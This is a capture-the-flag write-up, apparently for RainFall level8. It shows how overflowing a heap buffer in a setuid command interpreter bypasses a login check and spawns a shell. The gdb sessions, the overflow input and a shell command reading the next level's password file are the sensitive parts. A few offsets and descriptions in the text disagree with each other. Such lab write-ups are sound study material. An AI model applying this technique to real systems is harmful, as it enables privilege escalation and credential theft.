# LEVEL8 - Heap Overflow & Authentification Bypass

> Vulnerability class: Heap Buffer Overflow
> Binary: ELF 32-bits, dynamically linked, not stripped
> Tools used: GDB, objdump, file

---

## Overview

The program implements a simple command interpreter with four commands: `auth`, `reset`, `service`, and `login`. `auth` allocates a heap buffer and stores user input. `service` allocates a separate heap buffer adjacent in memory. The `login` command checks whether a field at offset `0x20` from the `auth` buffer is non-null before spawning a shell. By overflowing the `service` buffer backwards into the `auth` buffer's memory region, we write non-null bytes at that offset and bypass the check.

---

## 1. Reconnaissance

```bash
   $ file level8 
   level8: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3067a180acabc94d328ab89f0a5a914688bf67ab, not stripped
```
```bash
   $ checksec --file ./level8 
   RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
   No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./level8
```

Key observations:

- setuid/setgid binary: successful exploitation escalates privileges
- not stripped: function names are preserved, simplifying static analysis
- dynamically linked: library functions resolved at runtime via PLT/GOT
- NX disabled: the stack and heap are executable, meaning injected shellcode can run directly
- ASLR off: addresses are fixed across runs, no need to leak or brute force memory layout
- No stack canary: the saved return address can be overwritten without triggering any detection
- No PIE: the binary is loaded at a fixed base address every time, making PLT/GOT addresses predictable

---

## 2. Static Analysis

### 2.1 Program behavior

The program is an interactive command interpreter that reads from stdin in a loop and prints two pointers on each iteration:
```bash
   level8@RainFall:~$ ./level8 
   (nil), (nil) 
   auth albert
   0x804a008, (nil) 
   service foo
   0x804a008, 0x804a018 
   login
   Password:
   0x804a008, 0x804a018 
```

### 2.2 The four commands

Four string comparisons using `repz cmpsb` reveal the supported commands:
```bash
   (gdb) x/s 0x8048819
   0x8048819:       "auth "
   (gdb) x/s 0x804881f
   0x804881f:       "reset"
   (gdb) x/s 0x8048825
   0x8048825:       "service"
   (gdb) x/s 0x804882d
   0x804882d:       "login"
```

- `auth <input>` — allocates a heap buffer, stores input, saves pointer to global `auth` at `0x8049aac`
- `reset` — frees the `auth` buffer
- `service <input>` — allocates a heap buffer adjacent to `auth`, stores input
- `login` — checks a condition then spawns a shell or prints "Password:"

### 2.3 The shell condition

At the end of `main()`, after matching `login`, the code checks two conditions before calling `system("/bin/sh")`:
```bash
   0x080486dc <+376>:   jne    0x8048574 <main+16>       ; jump if input != "login"
   0x080486e2 <+382>:   mov    0x8049aac,%eax            ; load auth pointer
   0x080486e7 <+387>:   mov    0x20(%eax),%eax           ; load value at auth+0x20
   0x080486ea <+390>:   test   %eax,%eax
   0x080486ec <+392>:   je     0x80486ff <main+411>      ; jump if auth+0x20 == 0
   0x080486ee <+394>:   movl   $0x8048833,(%esp)         ; "/bin/sh"
   0x080486f5 <+401>:   call   0x8048480 <system@plt>
```

The program loads the `auth` pointer from the global `auth` variable, then reads the 32-bit value at `auth + 0x20` (32 bytes offset). If it is non-zero, execution reaches `system("/bin/sh")`.

### 2.4 Heap layout

Each `auth` and `service` call allocates a new heap chunk spaced 16 bytes apart:
```bash
   auth polo        ->  auth buffer at 0x804a008
   service albert   ->  service buffer at 0x804a018
```
The check reads from `auth + 0x20` = `0x804a008 + 0x20` = `0x804a028`. Since `service` allocates sequentially on the heap, a long enough `service` input overflows into `0x804a028`, writing non-null bytes there.

---

## 3. Vulnerability

`service` copies user input into a heap buffer with no bounds checking. Since `auth` and `service` buffers are adjacent in memory, overflowing `service` writes past its own chunk into higher heap addresses — including `auth + 0x20`, the exact location the `login` check reads from.

---

## 4. Exploitation

### 4.1 Identify the target offset

The `auth` buffer starts at `0x804a008`. The check reads from `auth + 0x20 = 0x804a028`. After `auth`, the next `service` allocation lands at `0x804a018`. To reach `0x804a028` from `0x804a018` we need to write at least `0x804a028 - 0x804a018 = 16` bytes into the `service` buffer:

```bash
   (gdb) run
   (nil), (nil) 
   auth AAAAAAAAAAAA
   0x804a008, (nil) 
   service BBBBCCCCDDDDEEEEFFFF
   0x804a008, 0x804a018 
   [...]
   x/wx $eax+20
   0x804a01c:      0x43434342   ; bytes written by service overflow
```


### 4.2 Payload construction

Any input to `service` longer than 16 bytes reaches `auth + 0x20` and satisfies the non-null check.


### 4.3 Execution

```
   (gdb) c
   Continuing.
   $ cat /home/user/level8/.pass
   XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

When `login` is entered, `auth + 0x20` contains bytes from the `service` overflow, the null check passes, and `system("/bin/sh")` is called.

## 5. Key Takeaways

| Concept | Detail |
|---|---|
| Heap adjacency | Consecutive `malloc()` calls produce predictable, adjacent heap chunks |
| Overflow into auth struct | Overflowing `service` writes past its chunk into the `auth` struct at a known offset |
| Authentication bypass | Writing non-null bytes at `auth+0x20` satisfies the login check without knowing any password |
| No format string here | `printf` uses `"%p, %p \n"` — the format string is hardcoded, input is safely passed as arguments |
| Command interpreter attack surface | Each command is a potential overflow vector — always validate input length per command |